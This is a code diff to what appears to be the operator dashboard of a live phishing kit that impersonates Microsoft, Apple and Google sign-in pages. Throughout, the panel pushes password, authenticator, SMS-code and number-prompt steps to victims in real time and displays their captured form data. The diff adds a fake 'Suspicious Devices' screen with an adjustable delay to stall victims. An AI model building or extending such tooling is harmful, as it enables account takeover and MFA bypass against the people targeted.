@@ -96,6 +96,8 @@ const STEP_LABELS: Record<string, string> = {
   'verify-phone-number': 'Phone Verify',
   'forgot': 'Forgot Pwd',
   'forgot-sent': 'Reset Sent',
+  'suspicious-devices': '🚨 Suspicious Devs',
+  'extend-removal-time': '⏱ Extend Wait',
 };
 
 const STEP_COLORS: Record<string, string> = {
@@ -129,6 +131,8 @@ const STEP_COLORS: Record<string, string> = {
   'forgot': '#9f1239',
   'forgot-sent': '#be185d',
   'signin-options': '#374151',
+  'suspicious-devices': '#dc2626',
+  'extend-removal-time': '#92400e',
 };
 
 const FIELD_LABELS: Record<string, string> = {
@@ -148,49 +152,75 @@ const FIELD_LABELS: Record<string, string> = {
   rec_email: 'Recovery Email',
   rec_code: 'Recovery Code',
   forgot_email: 'Forgot Pwd Email',
+  new_password: 'New Password',
   cant_use_input: "Can't Use Auth",
   phone_verify: 'Phone Verify Digits',
 };
 
-const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: string }[]> = {
-  microsoft: [
-    { label: '↩ Email',       step: 'email',               color: '#4b5563' },
-    { label: 'Password',      step: 'password',             color: '#0078D4' },
-    { label: '⎉ Code',        step: '__code_choice__',      color: '#7c3aed' },
-    { label: 'Authenticator', step: 'authenticator',        color: '#0078D4' },
-    { label: 'Phone Verify',  step: 'verify-phone-number',  color: '#7c3aed' },
-    { label: 'Other ways',      step: 'other-ways',     color: '#047857' },
-    { label: 'Register',        step: 'register',       color: '#be185d' },
-    { label: 'Recover',         step: 'recover',        color: '#9f1239' },
-    { label: '🛡 Security Alert', step: 'security-alert', color: '#dc2626' },
-  ],
-  apple: [
-    { label: '↩ Email',     step: 'email',            color: '#4b5563' },
-    { label: 'Password',    step: 'password',          color: '#007AFF' },
-    { label: 'Device',      step: 'device-trust',      color: '#1d4ed8' },
-    { label: 'Verify Code', step: 'verification-code', color: '#6d28d9' },
-    { label: 'Forgot Pwd',  step: 'forgot',            color: '#9f1239' },
-  ],
-  google: [
-    { label: '↩ Email',        step: 'email',          color: '#4b5563' },
-    { label: 'Password',       step: 'password',       color: '#4285F4' },
-    { label: 'Verify CAPTCHA', step: 'verify',         color: '#1a73e8' },
-    { label: 'Phone Verify',   step: 'phone-verify',   color: '#065f46' },
-    { label: 'Confirm #',      step: 'phone-confirm',  color: '#0d7a5f' },
-    { label: 'Wrong #',        step: 'phone-wrong',    color: '#dc2626' },
-    { label: 'Phone Code',     step: 'phone-code',     color: '#b45309' },
-    { label: 'Google Prompt',  step: 'prompt-number',  color: '#4285F4' },
-    { label: 'Update Phone',   step: 'phone-update',   color: '#7c3aed' },
-    { label: 'Killing Time',   step: 'killing-time',   color: '#1d4ed8' },
-  ],
-};
+type StepItem = { label: string; step: string; color: string };
+type StepCategory = { category: string; steps: StepItem[] };
 
-const PROVIDER_ERROR_STEPS: { label: string; step: string; color: string }[] = [
-  { label: '⏳ Loading',   step: 'processing',     color: '#92400e' },
+const LOADING_STEPS: StepItem[] = [
+  { label: '⏳ Just a moment…', step: 'processing', color: '#92400e' },
   { label: '✗ Email err',  step: 'error-email',    color: '#991b1b' },
   { label: '✗ Pwd err',    step: 'error-password', color: '#991b1b' },
   { label: '✗ Code err',   step: 'error-code',     color: '#991b1b' },
 ];
+
+const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
+  microsoft: [
+    { category: 'Login', steps: [
+      { label: '↩ Email',       step: 'email',              color: '#4b5563' },
+      { label: 'Password',      step: 'password',           color: '#0078D4' },
+      { label: '⎉ Code',        step: '__code_choice__',   color: '#7c3aed' },
+      { label: 'Authenticator', step: 'authenticator',     color: '#0078D4' },
+      { label: 'Phone Verify',  step: 'verify-phone-number', color: '#7c3aed' },
+      { label: 'Other ways',    step: 'other-ways',        color: '#047857' },
+      { label: 'Register',      step: 'register',          color: '#be185d' },
+      { label: 'Recover',       step: 'recover',           color: '#9f1239' },
+    ]},
+    { category: 'Security', steps: [
+      { label: '🛡 Security Alert',     step: 'security-alert',     color: '#dc2626' },
+      { label: '🚨 Suspicious Devices', step: 'suspicious-devices', color: '#dc2626' },
+      { label: '⏱ Extend Wait',        step: 'extend-removal-time', color: '#92400e' },
+    ]},
+    { category: 'Loading Screens', steps: LOADING_STEPS },
+  ],
+  apple: [
+    { category: 'Login', steps: [
+      { label: '↩ Email',     step: 'email',            color: '#4b5563' },
+      { label: 'Password',    step: 'password',         color: '#007AFF' },
+      { label: 'Device',      step: 'device-trust',     color: '#1d4ed8' },
+      { label: 'Verify Code', step: 'verification-code', color: '#6d28d9' },
+      { label: 'Forgot Pwd',  step: 'forgot',           color: '#9f1239' },
+    ]},
+    { category: 'Security', steps: [
+      { label: '🚨 Suspicious Devices', step: 'suspicious-devices',  color: '#dc2626' },
+      { label: '⏱ Extend Wait',        step: 'extend-removal-time', color: '#92400e' },
+    ]},
+    { category: 'Loading Screens', steps: LOADING_STEPS },
+  ],
+  google: [
+    { category: 'Login', steps: [
+      { label: '↩ Email',       step: 'email',         color: '#4b5563' },
+      { label: 'Password',      step: 'password',      color: '#4285F4' },
+      { label: 'Verify CAPTCHA', step: 'verify',       color: '#1a73e8' },
+      { label: 'Phone Verify',  step: 'phone-verify',  color: '#065f46' },
+      { label: 'Confirm #',     step: 'phone-confirm', color: '#0d7a5f' },
+      { label: 'Wrong #',       step: 'phone-wrong',   color: '#dc2626' },
+      { label: 'Phone Code',    step: 'phone-code',    color: '#b45309' },
+      { label: 'Google Prompt', step: 'prompt-number', color: '#4285F4' },
+      { label: 'Update Phone',  step: 'phone-update',  color: '#7c3aed' },
+      { label: 'Killing Time',  step: 'killing-time',  color: '#1d4ed8' },
+    ]},
+    { category: 'Security', steps: [
+      { label: '🚨 Suspicious Devices', step: 'suspicious-devices',  color: '#dc2626' },
+      { label: '⏱ Extend Wait',        step: 'extend-removal-time', color: '#92400e' },
+    ]},
+    { category: 'Loading Screens', steps: LOADING_STEPS },
+  ],
+};
+
 
 function parseUA(ua: string) {
   let browser = 'Unknown';
@@ -359,7 +389,7 @@ function VisitorModal({
       return;
     }
     // Immediate steps — send without preview confirmation
-    if (step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code') {
+    if (step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code' || step === 'extend-removal-time') {
       onPushAction(visitor.id, step, extra);
       return;
     }
@@ -459,7 +489,7 @@ function VisitorModal({
           </div>
 
           {/* Right panel */}
-          <div className="sm:w-[288px] flex-shrink-0 flex flex-col border-t sm:border-t-0 sm:border-l border-[#2d3139] overflow-y-auto bg-[#13151a]">
+          <div className="sm:w-[380px] flex-shrink-0 flex flex-col border-t sm:border-t-0 sm:border-l border-[#2d3139] overflow-y-auto bg-[#13151a]">
 
             {/* Mobile: location + browser row */}
             <div className="sm:hidden flex items-center gap-2 px-4 py-2.5 border-b border-[#2d3139] bg-[#16181d]">
@@ -474,18 +504,25 @@ function VisitorModal({
                   Visitor offline — actions will not be delivered
                 </div>
               )}
-              <div className={`space-y-1.5 ${!visitor.online ? 'opacity-40 pointer-events-none' : ''}`}>
-                {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
-                  <button
-                    key={step}
-                    onClick={() => triggerAction(step, label, color)}
-                    className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-left transition-all hover:brightness-110 active:scale-[0.98]"
-                    style={{ backgroundColor: `${color}18`, border: `1px solid ${color}35` }}
-                  >
-                    <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
-                    <span className="text-[13px] font-semibold flex-1" style={{ color }}>{label}</span>
-                    <span className="text-[11px] text-[#3e4450]">›</span>
-                  </button>
+              <div className={`space-y-4 ${!visitor.online ? 'opacity-40 pointer-events-none' : ''}`}>
+                {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ category, steps }) => (
+                  <div key={category}>
+                    <p className="text-[8px] font-bold uppercase tracking-[0.12em] text-[#444c5a] mb-1.5 px-0.5">{category}</p>
+                    <div className="space-y-1.5">
+                      {steps.map(({ label, step, color }) => (
+                        <button
+                          key={step}
+                          onClick={() => triggerAction(step, label, color)}
+                          className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-left transition-all hover:brightness-110 active:scale-[0.98]"
+                          style={{ backgroundColor: `${color}18`, border: `1px solid ${color}35` }}
+                        >
+                          <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
+                          <span className="text-[13px] font-semibold flex-1" style={{ color }}>{label}</span>
+                          <span className="text-[11px] text-[#3e4450]">›</span>
+                        </button>
+                      ))}
+                    </div>
+                  </div>
                 ))}
               </div>
 
@@ -625,25 +662,6 @@ function VisitorModal({
               )}
             </div>
 
-            {/* Simulate */}
-            <div className="p-5 border-b border-[#2d3139]">
-              <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b] mb-3">Simulate</p>
-              <div className={`space-y-1.5 ${!visitor.online ? 'opacity-40 pointer-events-none' : ''}`}>
-                {PROVIDER_ERROR_STEPS.map(({ label, step, color }) => (
-                  <button
-                    key={step}
-                    onClick={() => triggerAction(step, label, color)}
-                    className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-left transition-all hover:brightness-110 active:scale-[0.98]"
-                    style={{ backgroundColor: `${color}18`, border: `1px solid ${color}35` }}
-                  >
-                    <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
-                    <span className="text-[13px] font-semibold flex-1" style={{ color }}>{label}</span>
-                    <span className="text-[11px] text-[#3e4450]">›</span>
-                  </button>
-                ))}
-              </div>
-            </div>
-
             {/* Captured form data */}
             <div className="p-5 flex-1">
               <div className="flex items-center gap-2 mb-4">
@@ -732,8 +750,8 @@ function VisitorModal({
                                   <span className="text-[9px] text-[#3e4450] flex-shrink-0">
                                     #{previous.length - i} · {new Date(e.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                   </span>
-                                  <span className="text-[11px] font-mono text-[#555d6b] break-all text-right">
-                                    {sensitive ? '•'.repeat(Math.min(e.value.length, 12)) : e.value}
+                                  <span className="text-[11px] font-mono break-all text-right" style={{ color: sensitive && !revealed ? '#6b7280' : sensitive ? '#f87171' : '#555d6b' }}>
+                                    {sensitive && !revealed ? '•'.repeat(Math.min(e.value.length, 12)) : e.value}
                                   </span>
                                 </div>
                               ))}
@@ -783,6 +801,7 @@ export default function AdminPage() {
   const [googlePhone, setGooglePhone] = useState('09');
   const [gVerifyMethod, setGVerifyMethod] = useState<'sms' | 'auth'>('sms');
   const [gCorrectNumber, setGCorrectNumber] = useState(45);
+  const [removalWaitSeconds, setRemovalWaitSeconds] = useState(20);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
   const [adminCount, setAdminCount] = useState(1);
@@ -1036,7 +1055,9 @@ export default function AdminPage() {
   const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
-      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate, ...extra } }));
+      const payload: Record<string, unknown> = { navigate, ...(extra ?? {}) };
+      if (navigate === 'suspicious-devices') payload.waitSeconds = removalWaitSeconds;
+      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: payload }));
     }
   };
 
@@ -1405,6 +1426,31 @@ export default function AdminPage() {
               </div>
             </section>
           )}
+
+          {/* Security — all providers */}
+          <section className="space-y-2">
+            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Security</p>
+            <div className="rounded-lg border border-[#dc2626]/40 bg-[#1a1d24] px-3 py-3 space-y-3">
+              <div className="flex items-center gap-2.5">
+                <AlertCircle className="w-4 h-4 text-[#dc2626]" />
+                <div>
+                  <div className="text-[12px] text-[#aeb5c0] font-medium leading-none mb-0.5">Removal wait time</div>
+                  <div className="text-[10px] text-[#606672]">Suspicious devices loading screen</div>
+                </div>
+              </div>
+              <div className="flex gap-1.5">
+                {[20, 40, 60, 120].map(s => (
+                  <button key={s} onClick={() => setRemovalWaitSeconds(s)}
+                    className={`flex-1 py-1.5 rounded text-[11px] font-semibold transition-colors ${removalWaitSeconds === s ? 'bg-[#dc2626] text-white' : 'bg-[#2a2d35] text-[#8a919e] hover:bg-[#3a3f4a]'}`}>
+                    {s}s
+                  </button>
+                ))}
+              </div>
+              <div className="text-[10px] text-[#555d6b] leading-relaxed">
+                Push <span className="text-[#dc2626] font-mono">🚨 Suspicious Devices</span> from the visitor modal. Use <span className="text-[#92400e] font-mono">⏱ Extend Wait</span> to add 35s and show the "taking longer" message.
+              </div>
+            </div>
+          </section>
 
         </div>
 
